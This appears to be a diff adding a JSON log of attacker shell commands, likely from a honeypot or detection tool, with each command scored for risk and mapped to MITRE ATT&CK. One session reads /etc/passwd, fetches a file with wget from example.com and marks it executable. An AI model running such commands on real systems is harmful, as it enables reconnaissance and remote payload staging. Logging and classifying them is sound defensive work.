@@ -1,0 +1,137 @@
+[
+  {
+    "timestamp":"2026-08-01T14:00:01.000Z",
+    "session":"A82391",
+    "source_ip":"10.0.2.15",
+    "command":"whoami",
+    "process":"whoami",
+    "risk":"LOW",
+    "score":1.0,
+    "mitre":{
+      "tactic":"Discovery",
+      "technique":"T1083"
+    },
+    "mitre_tactic":"Discovery",
+    "mitre_technique":"T1083"
+  },
+  {
+    "timestamp":"2026-08-01T14:00:04.000Z",
+    "session":"A82391",
+    "source_ip":"10.0.2.15",
+    "command":"uname -a",
+    "process":"uname",
+    "risk":"LOW",
+    "score":1.0,
+    "mitre":{
+      "tactic":"Discovery",
+      "technique":"T1083"
+    },
+    "mitre_tactic":"Discovery",
+    "mitre_technique":"T1083"
+  },
+  {
+    "timestamp":"2026-08-01T14:00:08.000Z",
+    "session":"A82391",
+    "source_ip":"10.0.2.15",
+    "command":"ls -l",
+    "process":"ls",
+    "risk":"LOW",
+    "score":1.0,
+    "mitre":{
+      "tactic":"Discovery",
+      "technique":"T1083"
+    },
+    "mitre_tactic":"Discovery",
+    "mitre_technique":"T1083"
+  },
+  {
+    "timestamp":"2026-08-01T14:00:13.000Z",
+    "session":"A82391",
+    "source_ip":"10.0.2.15",
+    "command":"cat \/etc\/passwd",
+    "process":"cat",
+    "risk":"MEDIUM",
+    "score":5.0,
+    "mitre":{
+      "tactic":"Credential Access",
+      "technique":"T1003"
+    },
+    "mitre_tactic":"Credential Access",
+    "mitre_technique":"T1003"
+  },
+  {
+    "timestamp":"2026-08-01T14:00:20.000Z",
+    "session":"A82391",
+    "source_ip":"10.0.2.15",
+    "command":"wget http:\/\/example.com\/file",
+    "process":"wget",
+    "risk":"HIGH",
+    "score":8.0,
+    "mitre":{
+      "tactic":"Command and Control",
+      "technique":"T1105"
+    },
+    "mitre_tactic":"Command and Control",
+    "mitre_technique":"T1105"
+  },
+  {
+    "timestamp":"2026-08-01T14:00:28.000Z",
+    "session":"A82391",
+    "source_ip":"10.0.2.15",
+    "command":"chmod +x file",
+    "process":"chmod",
+    "risk":"HIGH",
+    "score":7.0,
+    "mitre":{
+      "tactic":"Persistence",
+      "technique":"T1222"
+    },
+    "mitre_tactic":"Persistence",
+    "mitre_technique":"T1222"
+  },
+  {
+    "timestamp":"2026-08-01T15:00:01.000Z",
+    "session":"B91244",
+    "source_ip":"10.0.2.20",
+    "command":"pwd",
+    "process":"pwd",
+    "risk":"LOW",
+    "score":1.0,
+    "mitre":{
+      "tactic":"Discovery",
+      "technique":"T1083"
+    },
+    "mitre_tactic":"Discovery",
+    "mitre_technique":"T1083"
+  },
+  {
+    "timestamp":"2026-08-01T15:00:05.000Z",
+    "session":"B91244",
+    "source_ip":"10.0.2.20",
+    "command":"ls",
+    "process":"ls",
+    "risk":"LOW",
+    "score":1.0,
+    "mitre":{
+      "tactic":"Discovery",
+      "technique":"T1083"
+    },
+    "mitre_tactic":"Discovery",
+    "mitre_technique":"T1083"
+  },
+  {
+    "timestamp":"2026-08-01T15:00:10.000Z",
+    "session":"B91244",
+    "source_ip":"10.0.2.20",
+    "command":"cd \/tmp",
+    "process":"cd",
+    "risk":"LOW",
+    "score":1.0,
+    "mitre":{
+      "tactic":"Discovery",
+      "technique":"T1083"
+    },
+    "mitre_tactic":"Discovery",
+    "mitre_technique":"T1083"
+  }
+]
